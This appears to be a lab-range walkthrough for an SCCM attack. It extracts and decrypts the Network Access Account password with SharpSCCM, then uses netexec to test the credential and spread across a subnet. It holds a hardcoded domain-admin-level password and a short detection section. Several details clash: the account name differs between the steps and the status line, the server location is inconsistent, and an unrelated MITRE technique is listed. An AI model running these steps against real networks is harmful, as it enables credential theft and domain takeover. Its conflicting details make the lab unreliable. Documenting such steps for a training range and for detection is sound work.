# WT#034 — SCCM NAA Credential Extraction

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | mbr02 (192.168.77.23) |
| **Domain** | range.local |
| **Starting Credential** | Code execution on mbr02 (low-priv or admin) |
| **Tools Required** | SharpSCCM, WMI Explorer |
| **Certifications** | WKL (WasteHelloKitty — OADOC) |
| **MITRE ATT&CK** | T1003.001 (OS Credential Dumping), T1218.003 (CMSTP) |
| **Difficulty** | Medium |

## Prerequisites
- Code execution on mbr02
- SCCM site server (CAD) installed on mbr02 — NAA credentials stored in WMI `SMS_SCI_Reserved`
- NAA (Network Access Account) configured with DA credentials (`N@A_s3rv1c3!`)

## Attack Steps

### 1. Identify SCCM site server

```powershell
# Query WMI for SCCM site information
Get-WmiObject -Namespace "root\CCM" -Class "SMS_Client" | Select-Object *
```

### 2. Extract NAA credentials from SMS Provider

```powershell
# Using SharpSCCM
SharpSCCM.exe get naa -s sccm-range.range.local
```

SharpSCCM queries `SMS_SCI_Reserved` class in the SMS Provider WMI namespace to retrieve the NAA credentials.

### 3. Decrypt NAA password

```powershell
# SharpSCCM automatically decrypts the NAA secret
SharpSCCM.exe get secrets -s sccm-range.range.local
```

Expected NAA credential:
- **Username**: `range\sccm-naa`
- **Password**: `N@A_s3rv1c3!`

### 4. Validate NAA credentials

```bash
# From attacker VM
netexec smb 192.168.77.23 -u 'range\sccm-naa' -p 'N@A_s3rv1c3!' --shares
netexec smb 192.168.77.10 -u 'range\sccm-naa' -p 'N@A_s3rv1c3!' --shares
```

### 5. Lateral movement with NAA credentials

```bash
netexec smb 192.168.77.0/24 -u 'range\sccm-naa' -p 'N@A_s3rv1c3!' --local-auth
```

## Post-Exploitation Chain
```
Code Exec on mbr02
  └──> SCCM NAA Extraction (WT#034)
       └──> range\sccm-naa (N@A_s3rv1c3!)
            ├──> Range.local DA-equivalent access
            ├──> SMB share access on all range.local machines
            ├──> SCCM Client Push (WT#036)
            └──> SCCM PXE Boot Abuse (WT#035)
```

## Telemetry Verification
**On SCCM site server:**
- **SMS Provider log**: `C:\Program Files\Microsoft Configuration Manager\Logs\SMSProv.log`
- **Event ID 4663** (WMI provider access — SMS_SCI_Reserved query)

**On mbr02:**
- **Event ID 4688** (Process creation — SharpSCCM.exe)
- WMI activity to namespace `root\SMS\site_<CODE>`
- Network connection to SCCM site server on port 2701 (SMS Provider) or 5985/5986 (WinRM)

**Detection Rules:**
- WMI queries against `SMS_SCI_Reserved` class from non-SCCM management tools
- SharpSCCM.exe binary execution on managed endpoints
- Network connections from member servers to SCCM site server's SMS Provider

## Status
**CONFIGURED** — SCCM site server (CAD) running on mbr02. NAA configured with `range\svc_naa` (DA in range.local). Verifiable via `10-sccm-verify.yml` (NAA check included). Requires SCCM Console access or WMI query to extract.
